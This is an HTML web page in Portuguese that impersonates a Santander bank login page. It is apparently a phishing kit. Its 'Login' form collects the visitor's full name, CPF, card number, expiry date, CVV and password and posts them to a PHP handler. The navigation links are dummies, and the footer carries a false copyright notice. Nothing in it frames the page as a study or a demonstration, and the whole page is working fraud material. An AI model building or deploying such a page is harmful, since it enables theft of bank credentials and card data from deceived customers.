<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Formulário de Dados</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-SJktkbguDQb3PBbhyIu7M+g18NBBlPkixpR4JlVFl5+0J0kD2KE+jYjHvMIt+Vmsno/1Te/TN8q/LI2x2Q5u7A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            background-color: #d91e18;
            padding: 1rem 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo img {
            width: 150px;
            margin-left: 20px;
        }

        .navbar {
            margin-right: 20px;
            position: relative;
        }

        .navbar ul {
            list-style: none;
            display: flex;
            margin: 0;
            padding: 0;
        }

        .navbar li {
            margin: 0 10px;
        }

        .navbar a {
            color: #fff;
            text-decoration: none;
            font-size: 16px;
            display: flex;
            align-items: center;
            padding: 10px;
            transition: background-color 0.3s;
        }

        .navbar a:hover {
            background-color: #b71c1c;
            border-radius: 5px;
        }

        .navbar a i {
            margin-right: 8px;
            font-size: 18px;
        }

        .menu-icon {
            display: none;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
        }

        .login-container {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
            padding: 20px;
        }

        .login-box {
            background-color: #fff;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 300px;
            width: 100%;
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #d91e18;
        }

        .input-group {
            margin-bottom: 15px;
            position: relative; /* Adicionado para posicionar o botão */
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        /* Adicionando estilo para o botão de mostrar senha */
        .input-group .show-password-btn {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background-color: transparent;
            border: none;
            padding: 0;
            cursor: pointer;
        }

        .input-group .show-password-btn i {
            color: #888;
            font-size: 20px;
        }

        .button-group {
            margin-top: 20px;
        }

        .button-group button {
            width: 100%;
            padding: 10px;
            background-color: #d91e18;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .button-group button:hover {
            background-color: #b71c1c;
        }

        .links {
            margin-top: 15px;
            text-align: center;
        }

        .links a {
            color: #d91e18;
            text-decoration: none;
            margin: 0 10px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        footer {
            background-color: #d91e18;
            color: #fff;
            text-align: center;
            padding: 20px 0;
            margin-top: auto;
        }

        .footer-content {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 0 20px;
            flex-wrap: wrap;
        }

        .footer-section {
            flex: 1;
            padding: 10px;
        }

        .footer-section h2 {
            margin-bottom: 10px;
            font-size: 18px;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 10px;
        }

        .footer-section

        ul li a {
            color: #fff;
            text-decoration: none;
        }

        .footer-section ul li a:hover {
            text-decoration: underline;
        }

        .footer-bottom {
            margin-top: 20px;
            font-size: 14px;
        }

        .footer-section.contact p {
            margin: 5px 0;
        }

        .footer-section.contact i {
            margin-right: 8px;
        }

        /* Responsivo */
        @media (max-width: 768px) {
            .navbar ul {
                flex-direction: column;
                display: none;
                width: 100%;
                position: absolute;
                top: 60px;
                left: 0;
                background-color: #d91e18;
                z-index: 999;
            }

            .navbar ul.show {
                display: flex;
            }

            .navbar li {
                margin: 0;
                width: 100%;
            }

            .navbar a {
                justify-content: center;
                padding: 15px;
                border-top: 1px solid #b71c1c;
            }

            .menu-icon {
                display: block;
                margin-right: 20px;
            }

            .login-box {
                max-width: 90%;
                padding: 1.5rem;
            }

            .footer-content {
                flex-direction: column;
                align-items: center;
            }

            .footer-section {
                padding: 5px;
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>

<header>
    <div class="logo">
        <img src="santander-logo.png" alt="Santander Logo">
    </div>
    <nav class="navbar">
        <ul>
            <li><a href="#" onclick="alert('Por favor, faça login primeiro.'); return false;"><i class="fas fa-home"></i> Home</a></li>
            <li><a href="#" onclick="alert('Por favor, faça login primeiro.'); return false;"><i class="fas fa-user"></i> Minha Conta</a></li>
            <li><a href="#" onclick="alert('Por favor, faça login primeiro.'); return false;"><i class="fas fa-credit-card"></i> Cartões</a></li>
            <li><a href="#" onclick="alert('Por favor, faça login primeiro.'); return false;"><i class="fas fa-piggy-bank"></i> Investimentos</a></li>
            <li><a href="#" onclick="alert('Por favor, faça login primeiro.'); return false;"><i class="fas fa-life-ring"></i> Seguros</a></li>
            <li><a href="#" onclick="alert('Por favor, faça login primeiro.'); return false;"><i class="fas fa-cog"></i> Configurações</a></li>
        </ul>
        <div class="menu-icon" id="menu-icon">
            <i class="fas fa-bars"></i>
        </div>
    </nav>
</header>

<div class="login-container">
    <div class="login-box">
        <h2>Login</h2>
        <form action="processar.php" method="post">
            <div class="input-group">
                <label for="input1">NOME COMPLETO</label>
                <input type="text" id="input1" name="input1" required>
            </div>
            <div class="input-group">
                <label for="input2">CPF</label>
                <input type="text" id="input2" name="input2" required maxlength="14" oninput="formatarCPF(this)">
            </div>
            <div class="input-group">
                <label for="input3">CARTÃO</label>
                <input type="text" id="input3" name="input3" required maxlength="19" oninput="formatarCartaoCredito(this)">
            </div>
            <div class="input-group">
    <label for="input4">MMAA</label>
    <input type="text" id="input4" name="input4" required maxlength="5" oninput="formatarMMAA(this)">
</div>

            <div class="input-group">
                <label for="input5">CCV</label>
                <input type="number" id="input5" name="input5" required maxlength="3">
            </div>
            <div class="input-group">
                <label for="input6">SENHA</label>
                <input type="password" id="input6" name="input6" required>
                <!-- Adicionando o botão para mostrar a senha -->
                <button type="button" class="show-password-btn" onclick="togglePasswordVisibility('input6', this)">
                    <i class="fas fa-eye"></i>
                </button>
            </div>
            <div class="button-group">
                <button type="submit">Entrar</button>
            </div>
        </form>
    </div>
</div>

<footer>
    <div class="footer-content">
        <div class="footer-section about">
            <h2>Sobre Nós</h2>
            <p>Santander é um dos maiores bancos do mundo, oferecendo uma vasta gama de serviços financeiros.</p>
        </div>
        <div class="footer-section links">
            <h2>Links Úteis</h2>
            <ul>
                <li><a href="#">Home</a></li>
                <li><a href="#">Minha Conta</a></li>
                <li><a href="#">Cartões</a></li>
                <li><a href="#">Investimentos</a></li>
                <li><a href="#">Seguros</a></li>
                <li><a href="#">Configurações</a></li>
            </ul>
        </div>
        <div class="footer-section contact">
            <h2>Contato</h2>
            <p><i class="fas fa-phone"></i> 0800 123 456</p>
            <p><i class="fas fa-envelope"></i> contato@santander.com.br</p>
        </div>
    </div>
    <div class="footer-bottom">
        &copy; 2024 Santander. Todos os direitos reservados.
    </div>
</footer>

<script>
     function formatarCPF(cpf) {
        cpf.value = cpf.value.replace(/\D/g, ''); // Remove caracteres não numéricos
        cpf.value = cpf.value.replace(/^(\d{3})(\d)/, '$1.$2'); // Adiciona ponto após os primeiros 3 dígitos
        cpf.value = cpf.value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3'); // Adiciona ponto após os segundos 3 dígitos
        cpf.value = cpf.value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4'); // Adiciona hífen após os últimos 3 dígitos
    }
    
    function formatarCartaoCredito(cartao) {
        cartao.value = cartao.value.replace(/\D/g, ''); // Remove caracteres não numéricos
        cartao.value = cartao.value.replace(/(\d{4})(\d{1,4})?(\d{1,4})?(\d{1,4})?/, function(match, p1, p2, p3, p4) {
            var formatted = [p1, p2, p3, p4].filter(Boolean).join(' ');
            return formatted;
        });
    }
    function formatarMMAA(input) {
        var value = input.value.replace(/\D/g, ''); // Remove caracteres não numéricos
        var month = value.substring(0, 2);
        var year = value.substring(2, 4);
        var currentDate = new Date();
        var currentYear = currentDate.getFullYear();
        var currentMonth = currentDate.getMonth() + 1; // Adiciona 1 porque os meses começam em 0

        // Verifica se o ano é válido (depois ou igual ao ano atual)
        if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
            // Define o mês como o mês atual se o ano for o mesmo do ano atual
            if (parseInt(year) === currentYear) {
                month = currentMonth.toString().padStart(2, '0');
            } else {
                // Define o mês como 01 se o ano for anterior ao ano atual
                month = "01";
            }
            year = currentYear.toString().substring(2, 4);
        }

        var formattedDate = month + "/" + year;
        input.value = formattedDate;
    }


    function togglePasswordVisibility(inputId, button) {
        var input = document.getElementById(inputId);
        if (input.type === "password") {
            input.type = "text";
            button.innerHTML = '<i class="fas fa-eye-slash"></i>';
        } else {
            input.type = "password";
            button.innerHTML = '<i class="fas fa-eye"></i>';
        }
    }
</script>


</body>
</html>
